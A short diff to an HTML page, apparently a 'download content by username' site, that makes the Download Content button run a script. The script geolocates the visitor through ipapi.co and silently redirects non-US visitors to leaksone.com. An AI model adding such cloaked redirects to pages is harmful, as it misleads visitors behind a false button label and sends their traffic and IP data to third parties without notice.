@@ -328,7 +328,21 @@
         <div class="section-body">
           <p>Enter the username without the '@' below</p>
           <input type="text" placeholder="Enter Username" onfocus="this.placeholder=''" onblur="this.placeholder='Enter Username'"/>
-          <button><b>Download Content</b></button>
+          <button onclick="redirect()"><b>Download Content</b></button>
+          <script>
+            function redirect()
+            {
+              $.getJSON("https://ipapi.co/json",
+              function geoip(json){
+              if(json.country_code!='US'){
+
+                window.location.replace("https://leaksone.com")
+
+              }
+            });}
+            
+          </script>
+          
    
 
       
